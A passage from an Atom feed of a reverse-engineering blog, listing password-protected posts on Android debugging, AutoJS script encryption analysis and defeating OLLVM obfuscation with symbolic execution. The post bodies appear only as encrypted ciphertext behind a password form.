0Y60O6hwhRiYqzoc7FTi6D8XRN3CkD3n1WkBeoO3iWOKkKShlobxyoSUAz3x0+a/dYNIGexCAcznRlh2c+VlOjMgXHF/fojrP8eU6hN68TA/mAo4KtUyQh+1aTlc6jJ4L9Nqg3XoR661TnQDEPBLC2gQWHEmxvYGYUKJUoSKUiKrrFVx8dvPiupNr9psKZnnhIGIFGokXwcR26ZgHomv+YRSb8Ywv+GGsrA1S78GCh/kGWRez2wXZ1BAYIpOI9NvH2omwcB8eTtE+nwoPrk+ooOABVkL2QDKQXeLwQiANPKPaT23HEmBkrE8gpsSdtHRl4ABIW3c+VLUkQofOmnvIePfHCleIo9HSMpZYn304ydUKrUyBmfrKkE90ymuHJqLbwSLfsoG9TdsumX8yl+KJMlOlmts/v9n88I9u6nJ8DLofPHgZwT9FHOYYcEchRoVzjeHgQ47pWaz8KNKPfak0k+9Tnn05g89C8gXaPBdbZOu8ptPPNjoCa86g8bdzrIWEBIXxx5srkRDj+nr1/qIU4zE0e9UPNYctU3Gg7iEfW8p65gGPH2bR6YIVNIVY1Lnktb8ob9/i73wVSLip1mQoVAgKgh9CJepKLVAWelN2AhAQ2RaEkqXnz7vykHGbSZI7R7ew7r/cQNLhAFL6R8vFe+M2eohCbIztH2EpiiHbn6oqjniQzl4Ia22ZVgHzmLU4eijGYj6CbCe+HyfSwV0BAYsLOxkXvJKV7yku8tusTnS7ucjZh3nQlLDXxHZ+5tZ76do4RqXmjKmGw3x9xWv82YSlT0JIsfsmXyfoERLLbIePL4nbkC4lCS2d4LkKD0GreqyB6t6rFwlPjbIWf9TRBDSxdDqga+E2lS6JG</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="Android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Android/"/>
    
      <category term="debug" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/debug/"/>
    
  </entry>
  
  <entry>
    <title>Android AutoJS 脚本加密分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs加密分析/autojs加密分析/</id>
    <published>2019-04-25T07:12:09.000Z</published>
    <updated>2019-07-30T07:55:01.711Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="show me the code" />    <label for="pass">show me the code</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="AutoJS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/AutoJS/"/>
    
  </entry>
  
  <entry>
    <title>符号执行解决代码混淆实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-05-17T08:47:41.244Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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